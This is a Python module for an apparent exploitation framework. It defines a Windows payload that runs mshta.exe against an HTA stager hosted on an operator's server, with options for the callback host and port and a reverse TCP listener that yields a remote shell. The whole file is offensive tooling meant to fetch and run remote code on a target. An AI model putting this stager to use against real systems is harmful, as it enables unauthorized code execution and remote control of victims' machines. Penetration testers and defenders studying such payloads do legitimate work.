#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_mshta_remote, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Windows Download Stager, mshta remote HTA",
        "description": (
            "Runs mshta.exe against a hosted HTA (stager.hta). "
            "Generate HTA with payloads/singles/cmd/windows/hta_reverse_tcp "
            "or host_stager generate --name stager.hta."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Operator host serving HTA", True)
    lport = OptPort(4444, "Callback port (embedded in HTA)", True)
    stager_url = OptString("", "Full URL of hosted .hta", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.hta")
            print_info(f"stager_url not set — using {url}")
        return build_mshta_remote(url)
